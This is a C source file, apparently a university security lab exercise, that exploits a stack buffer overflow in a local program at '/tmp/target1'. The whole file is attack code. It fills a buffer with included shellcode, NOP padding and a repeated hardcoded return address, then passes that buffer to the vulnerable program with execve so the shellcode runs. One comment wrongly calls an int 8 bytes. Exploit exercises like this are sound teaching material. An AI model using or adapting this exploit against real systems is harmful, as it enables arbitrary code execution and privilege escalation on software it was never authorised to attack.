#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"  // include shellcode file 

#define TARGET "/tmp/target1"
#define BUF_SIZE 1000 // make a large buffer 

int main(void)
{

// #################################################
  char buffer[BUF_SIZE];

//  printf("shellcode length %d\n", sizeof(shellcode));  // 46 char 

// Insert shellcode to front of the buffer, last byte of shellcode is \0, dont want to include
  int index = 0;
  for(; index < strlen(shellcode); index++){
      buffer[index] = shellcode[index];
  }

//add 3 char to fill in the gap so that ret match buf addr
  buffer[index++] = 0x90;
  buffer[index++] = 0x90;
  buffer[index++] = 0x90;

//fill in all the rest with buffer addr, overwrite the ret to main
// 0xbffff8d0 is the register address of buffer
// derefence a int (8bytes) and write ret into the last part of the buffer
  for(; index < BUF_SIZE - 4; index+=4) {
    *((int *) (buffer + index)) = 0xbffff8d0; 
  }

// #################################################
  
  char *args[3];
  char *env[1];
  args[0] = TARGET;
  args[1] = buffer; // pass buf to arg in bar() copy this buffer buf to overwrite buf[128]
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

